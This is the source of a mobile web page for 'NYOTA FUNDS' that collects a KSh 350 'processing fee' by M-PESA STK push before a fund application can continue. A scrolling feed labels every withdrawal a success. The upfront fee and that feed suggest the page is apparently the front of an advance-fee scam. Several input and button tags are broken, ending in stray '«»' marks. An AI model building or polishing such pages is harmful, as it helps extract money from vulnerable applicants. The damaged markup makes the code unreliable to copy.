<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0"><title>NYOTA FUNDS</title><style>

@import url('https://fonts.googleapis.com/css2?family=Mali:wght@400;500;600;700&display=swap');

*{
    box-sizing:border-box;
}

html,
body{
    margin:0;
    padding:0;
    width:100%;
    min-height:100%;
}

body{
    padding:7px;
    font-family:'Mali',sans-serif;
    background:#0B0217;
    color:#fff;
}

.container{
    width:100%;
    max-width:430px;
    margin:0 auto;
}


/* =================================
   PROCESSING FEE CARD
================================= */

.card{
    width:100%;
    height:50vh;
    min-height:360px;

    background:
        linear-gradient(
            145deg,
            rgba(255,255,255,0.09),
            rgba(255,255,255,0.035)
        );

    padding:14px;

    border-radius:18px;

    box-shadow:
        0 20px 60px rgba(0,0,0,0.45),
        inset 0 1px 0 rgba(255,255,255,0.05);

    border:1px solid rgba(255,255,255,0.10);

    display:flex;
    flex-direction:column;
    justify-content:center;

    overflow:hidden;
}


h1{
    text-align:center;
    color:#D4AF37;
    font-size:21px;
    font-weight:700;
    margin:0 0 6px;
}


p{
    text-align:center;
    font-size:12px;
    line-height:1.35;
    color:rgba(255,255,255,0.72);
    margin:5px 0;
}


.amount{
    width:100%;

    background:rgba(212,175,55,0.055);

    border:1px solid rgba(212,175,55,0.25);

    border-radius:12px;

    padding:10px;

    font-size:18px;
    font-weight:700;

    text-align:center;

    color:#fff;

    margin:7px 0;
}


label{
    display:block;

    margin-top:6px;
    margin-bottom:4px;

    font-size:12px;
    font-weight:700;

    color:rgba(255,255,255,0.88);
}


input{
    width:100%;
    height:43px;

    padding:0 11px;

    border:1px solid rgba(255,255,255,0.12);

    border-radius:10px;

    font-size:15px;

    font-family:'Mali',sans-serif;

    background:rgba(255,255,255,0.07);

    color:#fff;

    outline:none;
}


input:focus{
    border-color:rgba(212,175,55,0.8);

    box-shadow:
        0 0 0 3px rgba(212,175,55,0.10);
}


/* =================================
   PAY PROCESSING FEE BUTTON
================================= */

button{
    width:100%;

    height:47px;
    min-height:47px;

    padding:0 15px;

    margin-top:9px;
    margin-bottom:9px;

    background:
        linear-gradient(
            135deg,
            #D4AF37,
            #A67C00
        );

    color:#0B0217;

    border:none;

    border-radius:11px;

    font-family:'Mali',sans-serif;

    font-size:15px;

    font-weight:700;

    cursor:pointer;

    display:flex;
    align-items:center;
    justify-content:center;

    box-shadow:
        0 10px 30px rgba(212,175,55,0.20),
        inset 0 1px 0 rgba(255,255,255,0.55);
}


button:hover{
    background:
        linear-gradient(
            135deg,
            #D4AF37,
            #A67C00
        );
}


button:active{
    transform:scale(.98);
}


button:disabled{
    background:rgba(255,255,255,0.25);
    color:#fff;
    cursor:not-allowed;
    box-shadow:none;
}


#stkMessage{
    min-height:18px;

    margin:0;

    color:#D4AF37;

    font-size:11px;

    font-weight:600;

    line-height:1.3;

    text-align:center;
}


/* =================================
   RECENT WITHDRAWALS
================================= */

.activity-box{
    width:100%;

    height:50vh;
    min-height:300px;

    margin-top:7px;

    background:#1D293B;

    border-radius:22px;

    padding:12px 8px 10px;

    overflow:hidden;

    box-shadow:
        0 20px 60px rgba(0,0,0,0.45);
}


.activity-title{
    text-align:center;

    font-size:18px;

    font-weight:700;

    color:#fff;

    margin:0 0 8px;
}


.activity-title span{
    margin-right:5px;
}


/* =================================
   WITHDRAWAL WINDOW
================================= */

.activity-window{
    width:100%;

    height:calc(50vh - 55px);

    min-height:235px;

    overflow:hidden;

    position:relative;
}


.activity-track{
    display:flex;

    flex-direction:column;

    gap:8px;

    width:100%;
}


/* =================================
   WITHDRAWAL CARD
================================= */

.activity-item{
    width:100%;

    min-height:76px;

    background:#020617;

    border-radius:16px;

    border-left:5px solid #19C37D;

    display:flex;

    align-items:center;

    justify-content:space-between;

    padding:9px 9px 9px 11px;

    flex-shrink:0;
}


.activity-info{
    display:flex;

    flex-direction:column;

    gap:2px;

    min-width:0;
}


.activity-phone{
    font-size:14px;

    font-weight:600;

    color:#fff;
}


.activity-amount{
    font-size:13px;

    font-weight:500;

    color:#fff;
}


.activity-time{
    font-size:9px;

    color:rgba(255,255,255,0.50);

    margin-top:1px;
}


.activity-status{
    background:rgba(0,166,81,0.20);

    color:#19D99A;

    border-radius:40px;

    padding:8px 8px;

    font-size:8px;

    font-weight:700;

    white-space:nowrap;

    text-align:center;

    margin-left:5px;
}


/* =================================
   EMPTY / LOADING MESSAGE
================================= */

.activity-empty{
    text-align:center;

    padding:25px 10px;

    color:rgba(255,255,255,0.55);

    font-size:12px;
}


/* =================================
   SCROLL ANIMATION
================================= */

.activity-track.scrolling{
    animation:
        scrollActivity
        35s
        linear
        infinite;
}


.activity-window:active
.activity-track{
    animation-play-state:paused;
}


@keyframes scrollActivity{

    0%{
        transform:translateY(0);
    }

    100%{
        transform:translateY(-50%);
    }

}


/* =================================
   SMALL PHONES
================================= */

@media(max-width:360px){

    body{
        padding:5px;
    }

    .card{
        height:50vh;
        min-height:340px;
        padding:11px 10px;
        border-radius:15px;
    }

    h1{
        font-size:19px;
    }

    p{
        font-size:11px;
        line-height:1.3;
    }

    .amount{
        font-size:17px;
        padding:9px;
    }

    label{
        font-size:11px;
    }

    input{
        height:40px;
        font-size:14px;
    }

    button{
        height:44px;
        min-height:44px;
        font-size:14px;
    }

    .activity-box{
        height:50vh;
        min-height:280px;
        padding:11px 7px;
        border-radius:20px;
    }

    .activity-title{
        font-size:17px;
    }

    .activity-window{
        height:calc(50vh - 50px);
        min-height:220px;
    }

    .activity-item{
        min-height:70px;
        padding:8px 7px 8px 9px;
    }

    .activity-phone{
        font-size:13px;
    }

    .activity-amount{
        font-size:12px;
    }

    .activity-time{
        font-size:8px;
    }

    .activity-status{
        padding:7px 6px;
        font-size:7px;
    }

}

</style></head><body><div class="container"><!-- =================================
     PROCESSING FEE
================================= --><div class="card"><h1>PROCESSING FEE</h1><p>
Welcome, <strong><span id="name"></span></strong>
</p><p>
To continue with your NYOTA Fund application, please complete the processing fee payment below.
</p><div class="amount" id="feeAmount">
Processing Fee: KSh 350
</div><label>Full Name</label>

<input
type="text"
id="fullName"
readonly

«»

<label>M-PESA Phone Number</label>

<input
type="tel"
id="phone"
placeholder="2547XXXXXXXX"
inputmode="numeric"

«»

<button
id="payBtn"
onclick="payNow()"

«»

Pay Processing Fee

</button><p id="stkMessage"></p></div><!-- =================================
     RECENT WITHDRAWALS
================================= --><div class="activity-box"><div class="activity-title">
<span>📊</span>
Recent Withdrawals
</div><div class="activity-window"><div
    class="activity-track"
    id="activityTrack"
><div class="activity-empty">
Loading recent withdrawals...
</div></div></div></div></div><script>


/* =================================
   LOAD APPLICANT NAME
================================= */

let applicant =
    localStorage.getItem("applicantName");


document.getElementById("name").textContent =
    applicant || "Applicant";


document.getElementById("fullName").value =
    applicant || "";


/* =================================
   LOAD PROCESSING FEE
================================= */

let processingFee =
    localStorage.getItem("processingFee") || "350";


document.getElementById("feeAmount").textContent =
    "Processing Fee: KSh " +
    Number(processingFee).toLocaleString();



/* =================================
   TIME AGO FUNCTION
================================= */

function timeAgo(date){

    const seconds =
        Math.floor(
            (Date.now() - date.getTime()) / 1000
        );


    if(seconds < 60){

        return seconds +
            (
                seconds === 1
                ? " second ago"
                : " seconds ago"
            );
    }


    const minutes =
        Math.floor(seconds / 60);


    if(minutes < 60){

        return minutes +
            (
                minutes === 1
                ? " minute ago"
                : " minutes ago"
            );
    }


    const hours =
        Math.floor(minutes / 60);


    return hours +
        (
            hours === 1
            ? " hour ago"
            : " hours ago"
        );

}



/* =================================
   CREATE WITHDRAWAL CARD
================================= */

function createWithdrawal(item){

    const phone =
        item.phone ||
        item.phoneNumber ||
        "****";


    const amount =
        item.amount ||
        "0";


    const timestamp =
        item.timestamp ||
        item.createdAt ||
        item.date;


    let date =
        timestamp
        ? new Date(timestamp)
        : null;


    let displayTime =
        date && !isNaN(date.getTime())
        ? timeAgo(date)
        : "";


    const card =
        document.createElement("div");


    card.className =
        "activity-item";


    card.innerHTML = `

        <div class="activity-info">

            <div class="activity-phone">
                ${escapeHTML(phone)}
            </div>

            <div class="activity-amount">
                KSh. ${Number(amount).toLocaleString()}
            </div>

            <div class="activity-time">
                ${escapeHTML(displayTime)}
            </div>

        </div>

        <div class="activity-status">
            ✓ WITHDRAWAL SUCCESS
        </div>

    `;


    return card;

}



/* =================================
   BASIC HTML ESCAPE
================================= */

function escapeHTML(value){

    return String(value)
        .replace(/&/g,"&amp;")
        .replace(/</g,"&lt;")
        .replace(/>/g,"&gt;")
        .replace(/"/g,"&quot;")
        .replace(/'/g,"&#039;");

}



/* =================================
   LOAD REAL WITHDRAWALS
================================= */

async function loadWithdrawals(){

    const track =
        document.getElementById(
            "activityTrack"
        );


    try{

        const response =
            await fetch(
                "https://nyota-funds-backend.onrender.com/recent-withdrawals"
            );


        if(!response.ok){

            throw new Error(
                "Could not load withdrawals"
            );
        }


        const result =
            await response.json();


        let withdrawals =
            Array.isArray(result)
            ? result
            : (
                result.withdrawals ||
                result.data ||
                []
            );


        track.innerHTML = "";


        if(withdrawals.length === 0){

            track.innerHTML = `

                <div class="activity-empty">
                    No recent withdrawals available.
                </div>

            `;

            return;
        }


        /*
         Create first set.
        */

        withdrawals.forEach(item => {

            track.appendChild(
                createWithdrawal(item)
            );

        });


        /*
         Duplicate the real records only
         so the scrolling loop is smooth.
        */

        withdrawals.forEach(item => {

            track.appendChild(
                createWithdrawal(item)
            );

        });


        /*
         Start scrolling only when there
         are enough real records.
        */

        if(withdrawals.length > 2){

            track.classList.add(
                "scrolling"
            );

        }


    }catch(error){

        console.error(
            "WITHDRAWALS ERROR:",
            error
        );


        track.innerHTML = `

            <div class="activity-empty">
                Recent withdrawals are currently unavailable.
            </div>

        `;

    }

}


loadWithdrawals();



/* =================================
   UPDATE REAL WITHDRAWAL TIMES
================================= */

setInterval(() => {

    document
        .querySelectorAll(
            ".activity-item"
        )
        .forEach(card => {

            /*
             This section can update timestamps
             when the backend includes the original
             transaction timestamp as data.
            */

        });

},1000);



/* =================================
   START STK PUSH
================================= */

async function payNow(){

    let phone =
        document.getElementById("phone")
        .value
        .trim();


    if(phone === ""){

        alert(
            "Please enter your M-PESA phone number."
        );

        return;
    }


    localStorage.setItem(
        "phoneNumber",
        phone
    );


    localStorage.setItem(
        "fullName",
        document.getElementById(
            "fullName"
        ).value
    );


    let btn =
        document.getElementById(
            "payBtn"
        );


    btn.innerHTML =
        "Sending STK Push...";


    btn.disabled = true;


    try{

        let response =
            await fetch(
                "https://nyota-funds-backend.onrender.com/stk-push",
                {
                    method:"POST",

                    headers:{
                        "Content-Type":
                            "application/json"
                    },

                    body:JSON.stringify({

                        phone:phone,

                        amount:
                            Number(
                                processingFee
                            )

                    })
                }
            );


        let data =
            await response.json();


        console.log(
            "STK RESPONSE:",
            data
        );


        if(
            !response.ok ||
            !data.success
        ){

            throw new Error(
                data.message ||
                "STK Push failed"
            );
        }


        let transactionId =
            data.transactionId ||
            data.checkout_request_id;


        if(!transactionId){

            throw new Error(
                "No Paylor transaction ID received"
            );
        }


        btn.innerHTML =
            "Processing...";


        document.getElementById(
            "stkMessage"
        ).innerHTML =
            "An M-PESA payment request has been sent to your phone. Please enter your M-PESA PIN to complete the payment.";


        checkPayment(
            transactionId
        );


    }catch(error){

        console.log(
            "PAYMENT ERROR:",
            error
        );


        alert(
            error.message ||
            "Payment request failed."
        );


        btn.innerHTML =
            "Pay Processing Fee";


        btn.disabled = false;

    }

}



/* =================================
   CHECK PAYMENT STATUS
================================= */

async function checkPayment(
    transactionId
){

    let interval =
        setInterval(
            async()=>{

                try{

                    let response =
                        await fetch(
                            "https://nyota-funds-backend.onrender.com/payment-status",
                            {
                                method:"POST",

                                headers:{
                                    "Content-Type":
                                        "application/json"
                                },

                                body:
                                    JSON.stringify({

                                        transactionId:
                                            transactionId

                                    })
                            }
                        );


                    let result =
                        await response.json();


                    console.log(
                        "PAYMENT STATUS:",
                        result
                    );


                    if(
                        !result.success ||
                        !result.data
                    ){

                        return;
                    }


                    let payment =
                        result.data;


                    let status =
                        String(
                            payment.status || ""
                        ).toUpperCase();


                    /*
                    PAYMENT SUCCESS
                    */

                    if(
                        status === "COMPLETED"
                    ){

                        clearInterval(
                            interval
                        );


                        document.getElementById(
                            "stkMessage"
                        ).innerHTML =
                            "✅ Payment successful. Redirecting...";


                        window.location.href =
                            "delivery.html";

                    }


                    /*
                    PAYMENT FAILED
                    */

                    else if(
                        status === "CANCELLED" ||
                        status === "FAILED"
                    ){

                        clearInterval(
                            interval
                        );


                        document.getElementById(
                            "stkMessage"
                        ).innerHTML =
                            "❌ Payment " +
                            status.toLowerCase() +
                            ".";


                        document.getElementById(
                            "payBtn"
                        ).disabled = false;


                        document.getElementById(
                            "payBtn"
                        ).innerHTML =
                            "Pay Processing Fee";

                    }


                }catch(error){

                    console.log(
                        "STATUS ERROR:",
                        error
                    );

                }

            },
            3000
        );

}

</script></body></html>
